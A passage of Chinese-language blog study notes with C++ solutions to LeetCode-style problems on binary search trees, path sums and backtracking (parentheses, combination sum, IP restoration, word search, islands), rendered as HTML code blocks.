&#123;</span><br><span class="line">            if(postorder[i]&lt;postorder[end])</span><br><span class="line">            &#123;</span><br><span class="line">                return false;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        return _verifyPostorder(postorder,start,low-1)&amp;&amp;_verifyPostorder(postorder,low,end-1); </span><br><span class="line">    &#125;</span><br><span class="line">    bool verifyPostorder(vector&lt;int&gt;&amp; postorder) &#123;</span><br><span class="line">        if(postorder.size()==0||postorder.size()==1) return true;</span><br><span class="line">        return _verifyPostorder(postorder,0,postorder.size()-1);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><h2 id="二叉搜索树删除节点"><a href="#二叉搜索树删除节点" class="headerlink" title="二叉搜索树删除节点"></a>二叉搜索树删除节点</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">二叉搜索树一定要利用性质</span><br><span class="line">在递归过程中一般采用root-&gt;val和条件比较大小判断往左走还是往右走</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><span class="line">/**</span><br><span class="line"> * Definition for a binary tree node.</span><br><span class="line"> * struct TreeNode &#123;</span><br><span class="line"> *     int val;</span><br><span class="line"> *     TreeNode *left;</span><br><span class="line"> *     TreeNode *right;</span><br><span class="line"> *     TreeNode() : val(0), left(nullptr), right(nullptr) &#123;&#125;</span><br><span class="line"> *     TreeNode(int x) : val(x), left(nullptr), right(nullptr) &#123;&#125;</span><br><span class="line"> *     TreeNode(int x, TreeNode *left, TreeNode *right) : val(x), left(left), right(right) &#123;&#125;</span><br><span class="line"> * &#125;;</span><br><span class="line"> */</span><br><span class="line">class Solution &#123;</span><br><span class="line">public:</span><br><span class="line">    //返回删除key后的root</span><br><span class="line">    TreeNode* deleteNode(TreeNode* root, int key) &#123;</span><br><span class="line">        if(root==nullptr)</span><br><span class="line">        &#123;</span><br><span class="line">            return root;</span><br><span class="line">        &#125;</span><br><span class="line">        //要利用二叉搜索树的特点</span><br><span class="line">        if(root-&gt;val&gt;key)</span><br><span class="line">        &#123;</span><br><span class="line">            root-&gt;left=deleteNode(root-&gt;left,key);</span><br><span class="line">        &#125;</span><br><span class="line">        if(root-&gt;val&lt;key)</span><br><span class="line">        &#123;</span><br><span class="line">            root-&gt;right=deleteNode(root-&gt;right,key);</span><br><span class="line">        &#125;</span><br><span class="line">        if(root-&gt;val==key)</span><br><span class="line">        &#123;</span><br><span class="line">            if(root-&gt;left&amp;&amp;root-&gt;right)</span><br><span class="line">            &#123;</span><br><span class="line">                auto tmp=getMin(root-&gt;right);</span><br><span class="line">                root-&gt;val=tmp-&gt;val;</span><br><span class="line">                root-&gt;right=deleteNode(root-&gt;right,tmp-&gt;val);</span><br><span class="line">            &#125;</span><br><span class="line">            else</span><br><span class="line">            &#123;</span><br><span class="line">                return root-&gt;left==nullptr?root-&gt;right:root-&gt;left;  </span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        return root;</span><br><span class="line">    &#125;</span><br><span class="line">    TreeNode* getMin(TreeNode* root) &#123;</span><br><span class="line">        if(root==nullptr)</span><br><span class="line">        &#123;</span><br><span class="line">            return root;</span><br><span class="line">        &#125;</span><br><span class="line">        while(root-&gt;left)</span><br><span class="line">        &#123;</span><br><span class="line">            root=root-&gt;left;</span><br><span class="line">        &#125;</span><br><span class="line">        return root;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><h2 id="不同的二叉搜索树"><a href="#不同的二叉搜索树" class="headerlink" title="不同的二叉搜索树"></a>不同的二叉搜索树</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">class Solution &#123;</span><br><span class="line">public:</span><br><span class="line">    int numTrees(int n) &#123;</span><br><span class="line">        vector&lt;int&gt; dp(n+1,0);</span><br><span class="line">        //dp[i]表示i个数所有二叉搜索树的个数</span><br><span class="line">        //G(n)=f(1)+f(2)+...+f(n)</span><br><span class="line">        //f(i)=G(i-1)*G(n-i)</span><br><span class="line">        //G(n)=G(0)*G(n-1)+...+G(n-1)*G(0)</span><br><span class="line">        dp[0]=1;</span><br><span class="line">        dp[1]=1;</span><br><span class="line">        for(int i=2;i&lt;=n;i++)</span><br><span class="line">        &#123;</span><br><span class="line">            for(int j=1;j&lt;=i;j++)</span><br><span class="line">            &#123;</span><br><span class="line">                dp[i]+=dp[j-1]*dp[i-j];</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        return dp[n];</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><h2 id="路径之和（自顶向下）"><a href="#路径之和（自顶向下）" class="headerlink" title="路径之和（自顶向下）"></a>路径之和（自顶向下）</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">每次进来tmp加入当前根</span><br><span class="line">判断叶子节点时，加入结果</span><br><span class="line">左右子树递归</span><br><span class="line">最后删除选择</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">class Solution &#123;</span><br><span class="line">public:</span><br><span class="line">    vector&lt;int&gt; tmp;</span><br><span class="line">    vector&lt;vector&lt;int&gt;&gt; ans;</span><br><span class="line">    void dfs(TreeNode* root,int target)</span><br><span class="line">    &#123;</span><br><span class="line">        if(root==nullptr)</span><br><span class="line">        &#123;</span><br><span class="line">            return;</span><br><span class="line">        &#125;</span><br><span class="line">        tmp.push_back(root-&gt;val);</span><br><span class="line">        if(root-&gt;left==nullptr&amp;&amp;root-&gt;right==nullptr&amp;&amp;target==root-&gt;val)</span><br><span class="line">        &#123;</span><br><span class="line">            ans.push_back(tmp);</span><br><span class="line">        &#125;</span><br><span class="line">        dfs(root-&gt;left,target-root-&gt;val);</span><br><span class="line">        dfs(root-&gt;right,target-root-&gt;val);</span><br><span class="line">        tmp.pop_back();</span><br><span class="line">    &#125;</span><br><span class="line">    vector&lt;vector&lt;int&gt;&gt; pathSum(TreeNode* root, int targetSum) &#123;</span><br><span class="line">        dfs(root,targetSum);</span><br><span class="line">        return ans;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><h2 id="最大路径和-自底向上"><a href="#最大路径和-自底向上" class="headerlink" title="最大路径和(自底向上)"></a>最大路径和(自底向上)</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">1.一般dfs定义为以root为起点的路径和</span><br><span class="line">2.一般有一个全局变量记录经过root，但不一定以root为起点的路径</span><br><span class="line"></span><br><span class="line">3.后序遍历的方式</span><br></pre></td></tr></table></figure><h2 id="最大路径和不一定过根节点"><a href="#最大路径和不一定过根节点" class="headerlink" title="最大路径和不一定过根节点"></a>最大路径和不一定过根节点</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">class Solution &#123;</span><br><span class="line">public:</span><br><span class="line">//返回以root为起点且以root为起点的最大路径和</span><br><span class="line">//当左子树右子树的最大路径和小于0，则从root开始</span><br><span class="line">//左子树右子树最大路径和均大于0,maxpath=root-&gt;val+dfs(root-&gt;left)+dfs(root-&gt;right)</span><br><span class="line">    int maxpath=INT_MIN; </span><br><span class="line">    int dfs(TreeNode* root)</span><br><span class="line">    &#123;</span><br><span class="line">        if(root==nullptr)</span><br><span class="line">            return 0;</span><br><span class="line">        int left=max(dfs(root-&gt;left),0);</span><br><span class="line">        int right=max(dfs(root-&gt;right),0);</span><br><span class="line">        maxpath=max(root-&gt;val+left+right,maxpath);</span><br><span class="line">        return max(root-&gt;val+left,root-&gt;val+right);</span><br><span class="line">    &#125;</span><br><span class="line">    int maxPathSum(TreeNode* root) &#123;</span><br><span class="line">        dfs(root);</span><br><span class="line">        return maxpath;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><h2 id="求和路径-双层dfs"><a href="#求和路径-双层dfs" class="headerlink" title="求和路径(双层dfs)"></a>求和路径(双层dfs)</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">以每个节点作路径和查找</span><br><span class="line">class Solution &#123;</span><br><span class="line">public:</span><br><span class="line">//返回以root为起点且经过root的最大路径和</span><br><span class="line">//当左子树右子树的最大路径和小于0，则从root开始</span><br><span class="line">//左子树右子树最大路径和均大于0,maxpath=root-&gt;val+dfs(root-&gt;left)+dfs(root-&gt;right)</span><br><span class="line">    int maxpath=INT_MIN; </span><br><span class="line">    int dfs(TreeNode* root)</span><br><span class="line">    &#123;</span><br><span class="line">        if(root==nullptr)</span><br><span class="line">            return 0;</span><br><span class="line">        int left=max(dfs(root-&gt;left),0);</span><br><span class="line">        int right=max(dfs(root-&gt;right),0);</span><br><span class="line">        maxpath=max(root-&gt;val+left+right,maxpath);</span><br><span class="line">        return max(root-&gt;val+left,root-&gt;val+right);</span><br><span class="line">    &#125;</span><br><span class="line">    int maxPathSum(TreeNode* root) &#123;</span><br><span class="line">        dfs(root);</span><br><span class="line">        return maxpath;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><h1 id="4-回溯"><a href="#4-回溯" class="headerlink" title="4.回溯"></a>4.回溯</h1><h2 id="1-DFS"><a href="#1-DFS" class="headerlink" title="(1)DFS"></a><strong>(1)DFS</strong></h2><h3 id="括号生成"><a href="#括号生成" class="headerlink" title="括号生成"></a>括号生成</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">这个题很特殊的剪枝技巧：</span><br><span class="line">已选择的(比）多才能满足匹配的原则，所以一般传进去只需要判断</span><br><span class="line">left==0&amp;&amp;right==0   满足条件</span><br><span class="line">left&gt;0  先使用(往下搜</span><br><span class="line">right&gt;left说明用过的left&gt;right 这时候可以使用）往下递归</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">class Solution &#123;</span><br><span class="line">public:</span><br><span class="line">//dfs传入(剩余个数left ,)剩余个数right，传记录结果的变量str，这时候就不需要回溯</span><br><span class="line">    vector&lt;string&gt; ans;</span><br><span class="line">    void dfs(int n,int left,int right,string str)</span><br><span class="line">    &#123;</span><br><span class="line">        //base case</span><br><span class="line">        if(left==0&amp;&amp;right==0)</span><br><span class="line">        &#123;</span><br><span class="line">            ans.emplace_back(str);</span><br><span class="line">            return;</span><br><span class="line">        &#125;</span><br><span class="line">        //合法情况,优先塞左括号</span><br><span class="line">        if(left&gt;0)</span><br><span class="line">        &#123;</span><br><span class="line">            dfs(n,left-1,right,str+&quot;(&quot;);</span><br><span class="line">        &#125;</span><br><span class="line">        //还有一种合法情况就是剩余的right要多余left</span><br><span class="line">        if(right&gt;left)</span><br><span class="line">        &#123;</span><br><span class="line">            dfs(n,left,right-1,str+&quot;)&quot;);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    vector&lt;string&gt; generateParenthesis(int n) &#123;</span><br><span class="line">        dfs(n,n,n,&quot;&quot;);</span><br><span class="line">        return ans;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><h3 id="组合之和"><a href="#组合之和" class="headerlink" title="组合之和"></a>组合之和</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">思路：</span><br><span class="line">为了避免组合之和重复，一般传一个startIndex，可选范围可以是[startIndex,end）【可重复选择】或者是(startIndex,end）【不可重复选择】</span><br></pre></td></tr></table></figure><p>不可重复使用：先排序，对于选择中相同的相邻元素进行去重</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line">class Solution &#123;</span><br><span class="line">public:</span><br><span class="line">    vector&lt;int&gt; tmp;</span><br><span class="line">    vector&lt;vector&lt;int&gt;&gt; ans;</span><br><span class="line">    void dfs(vector&lt;int&gt;&amp; candidates,int startIndex,int target)</span><br><span class="line">    &#123;</span><br><span class="line">        if(startIndex&gt;candidates.size()||target&lt;0)</span><br><span class="line">        &#123;</span><br><span class="line">            return;</span><br><span class="line">        &#125;</span><br><span class="line">        if(target==0)</span><br><span class="line">        &#123;</span><br><span class="line">            ans.emplace_back(tmp);</span><br><span class="line">        &#125;</span><br><span class="line">        for(int i=startIndex;i&lt;candidates.size();i++)</span><br><span class="line">        &#123;</span><br><span class="line">            //做选择</span><br><span class="line">            if(i!=startIndex&amp;&amp;candidates[i]==candidates[i-1])</span><br><span class="line">            &#123;</span><br><span class="line">                continue;</span><br><span class="line">            &#125;</span><br><span class="line">            tmp.emplace_back(candidates[i]);</span><br><span class="line">            //递归下去</span><br><span class="line">            dfs(candidates,i+1,target-candidates[i]);</span><br><span class="line">            //递归完出来，抛弃选择</span><br><span class="line">            tmp.pop_back();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    vector&lt;vector&lt;int&gt;&gt; combinationSum2(vector&lt;int&gt;&amp; candidates, int target) &#123;</span><br><span class="line">        sort(candidates.begin(),candidates.end());</span><br><span class="line">        dfs(candidates,0,target);</span><br><span class="line">        return ans;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><h3 id="复原ip"><a href="#复原ip" class="headerlink" title="复原ip"></a>复原ip</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><span class="line">class Solution &#123;</span><br><span class="line">private:</span><br><span class="line">    vector&lt;string&gt; ans;</span><br><span class="line">    vector&lt;string&gt; tmp;</span><br><span class="line">public:</span><br><span class="line">    void dfs(string s,int startIndex)</span><br><span class="line">    &#123;</span><br><span class="line">        //当开始标记越界，返回</span><br><span class="line">        //base case</span><br><span class="line">        //当tmp.size()==4时，返回啦</span><br><span class="line">        if(tmp.size()==4)</span><br><span class="line">        &#123;</span><br><span class="line">            //还有剩余的元素，不符合题意</span><br><span class="line">            if(startIndex&lt;s.size())</span><br><span class="line">            &#123;</span><br><span class="line">                return;</span><br><span class="line">            &#125;</span><br><span class="line">            //没有剩余元素</span><br><span class="line">            if(startIndex==s.size())</span><br><span class="line">            &#123;</span><br><span class="line">                string tmp1=tmp[0];</span><br><span class="line">                for(int i=0;i&lt;3;i++)</span><br><span class="line">                &#123;</span><br><span class="line">                    tmp1=tmp1+&quot;.&quot;+tmp[i+1];</span><br><span class="line">                &#125;</span><br><span class="line">                ans.emplace_back(tmp1);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        for(int len=1;len&lt;=3;len++)</span><br><span class="line">        &#123;</span><br><span class="line">            if(startIndex&gt;=s.size())</span><br><span class="line">            &#123;</span><br><span class="line">                return;</span><br><span class="line">            &#125;</span><br><span class="line">            if(len!=1&amp;&amp;s[startIndex]==&#x27;0&#x27;)</span><br><span class="line">            &#123;</span><br><span class="line">                return;</span><br><span class="line">            &#125;</span><br><span class="line">            string sstr=s.substr(startIndex,len);</span><br><span class="line">            if(len==3&amp;&amp;stoi(sstr)&gt;255)</span><br><span class="line">            &#123;</span><br><span class="line">                return;</span><br><span class="line">            &#125;</span><br><span class="line">            tmp.push_back(sstr);</span><br><span class="line">            dfs(s,startIndex+len);</span><br><span class="line">            tmp.pop_back();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    vector&lt;string&gt; restoreIpAddresses(string s) &#123;</span><br><span class="line">        dfs(s,0);</span><br><span class="line">        return ans;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><h3 id="全排列"><a href="#全排列" class="headerlink" title="全排列"></a>全排列</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1.使用isvisit标记当前元素访问过</span><br></pre></td></tr></table></figure><h3 id="二维平面回溯注意事项"><a href="#二维平面回溯注意事项" class="headerlink" title="二维平面回溯注意事项"></a>二维平面回溯注意事项</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">1.如果使用过的元素不能再用通常采用isvisited数组(一维或者二维)标记当前元素是否访问过，所以在撤销选择时需要将isvisited撤销</span><br><span class="line">2.如果边深搜边修改(board中不存在的元素)，则不需要isvisited数组标记</span><br><span class="line">2.二维坐标startx,starty上下左右遍历通常采用</span><br><span class="line">vector&lt;vector&lt;int&gt;&gt; d&#123;&#123;-1,0&#125;,&#123;1,0&#125;,&#123;0,-1&#125;,&#123;0,1&#125;&#125;;</span><br><span class="line">for(int i=0;i&lt;4;i++)</span><br><span class="line">&#123;</span><br><span class="line">newx=startx+d[i][0];</span><br><span class="line">newy=starty+d[i][1];</span><br><span class="line">&#125;</span><br><span class="line">实现上下左右遍历</span><br></pre></td></tr></table></figure><h3 id="单词搜索"><a href="#单词搜索" class="headerlink" title="单词搜索"></a>单词搜索</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line">1.</span><br><span class="line">class Solution &#123;</span><br><span class="line">public:</span><br><span class="line">    vector&lt;vector&lt;int&gt;&gt; d&#123;&#123;-1,0&#125;,&#123;1,0&#125;,&#123;0,-1&#125;,&#123;0,1&#125;&#125;;</span><br><span class="line">    bool search_word(vector&lt;vector&lt;char&gt;&gt;&amp; board,vector&lt;vector&lt;bool&gt;&gt;&amp; isvisit,</span><br><span class="line">    string word,int index,int startx,int starty)</span><br><span class="line">    &#123;</span><br><span class="line">        //如果index到头了，并且最后一个字符相等，base case</span><br><span class="line">        if(index==word.size()-1)</span><br><span class="line">        &#123;</span><br><span class="line">            return board[startx][starty]==word[index];</span><br><span class="line">        &#125;</span><br><span class="line">        //当前board[starty][starty]==word[index],向其他方向搜索</span><br><span class="line">        if(board[startx][starty]==word[index])</span><br><span class="line">        &#123;</span><br><span class="line">            isvisit[startx][starty]=true;</span><br><span class="line">            for(int i=0;i&lt;4;i++)</span><br><span class="line">            &#123;</span><br><span class="line">                int newx=startx+d[i][0];</span><br><span class="line">                int newy=starty+d[i][1];</span><br><span class="line">                if( ( newx&gt;=0&amp;&amp;newx&lt;board.size()&amp;&amp;newy&gt;=0&amp;&amp;newy&lt;board[0].size() )&amp;&amp;!isvisit[newx][newy] &amp;&amp;search_word(board,isvisit,word,index+1,newx,newy) )</span><br><span class="line">                &#123;</span><br><span class="line">                    return true;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            isvisit[startx][starty]=false;</span><br><span class="line">        &#125;</span><br><span class="line">        return false;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">    bool exist(vector&lt;vector&lt;char&gt;&gt;&amp; board, string word) &#123;</span><br><span class="line">        int m=board.size();</span><br><span class="line">        int n=board[0].size();</span><br><span class="line">        vector&lt;vector&lt;bool&gt;&gt; isvalid(m,vector&lt;bool&gt;(n,false));</span><br><span class="line">        for(int i=0;i&lt;m;i++)</span><br><span class="line">        &#123;</span><br><span class="line">            for(int j=0;j&lt;n;j++)</span><br><span class="line">            &#123;</span><br><span class="line">                //从board[i][j]开始搜寻word</span><br><span class="line">                if( search_word(board,isvalid,word,0,i,j) )</span><br><span class="line">                    return true;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        //所有搜完都没有搜到，说明没有</span><br><span class="line">        return false;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><h3 id="岛屿数量"><a href="#岛屿数量" class="headerlink" title="岛屿数量"></a>岛屿数量</h3><h3 id="floodfill算法"><a href="#floodfill算法" class="headerlink" title="floodfill算法"></a>floodfill算法</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line">class Solution &#123;</span><br><span class="line">private:</span><br><span class="line">    vector&lt;vector&lt;bool&gt;&gt; isvisited;</span><br><span class="line">    int ans=0;</span><br><span class="line">    vector&lt;vector&lt;int&gt;&gt; d=&#123;&#123;-1,0&#125;,&#123;0,1&#125;,&#123;1,0&#125;,&#123;0,-1&#125;&#125;;</span><br><span class="line">public:</span><br><span class="line">    bool isvaild(vector&lt;vector&lt;char&gt;&gt;&amp; grid,int x,int y)</span><br><span class="line">    &#123;</span><br><span class="line">        return x&gt;=0&amp;&amp;x&lt;grid.size()&amp;&amp;y&gt;=0&amp;&amp;y&lt;grid[0].size();</span><br><span class="line">    &#125;</span><br><span class="line">    void backtracking(vector&lt;vector&lt;char&gt;&gt;&amp; grid,int startx,int starty)</span><br><span class="line">    &#123;</span><br><span class="line">        isvisited[startx][starty]=true;</span><br><span class="line">        for(int i=0;i&lt;4;i++)</span><br><span class="line">        &#123;</span><br><span class="line">            int newx=startx+d[i][0];</span><br><span class="line">            int newy=starty+d[i][1];</span><br><span class="line">            if( isvaild(grid,newx,newy) &amp;&amp; !isvisited[newx][newy] &amp;&amp; grid[newx][newy]==&#x27;1&#x27; )</span><br><span class="line">            &#123;</span><br><span class="line">                backtracking(grid,newx,newy);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">    int numIslands(vector&lt;vector&lt;char&gt;&gt;&amp; grid) &#123;</span><br><span class="line">        int m=grid.size();</span><br><span class="line">        int n=grid[0].size();</span><br><span class="line">        isvisited=vector&lt;vector&lt;bool&gt;&gt;(m,vector&lt;bool&gt;(n,false));</span><br><span 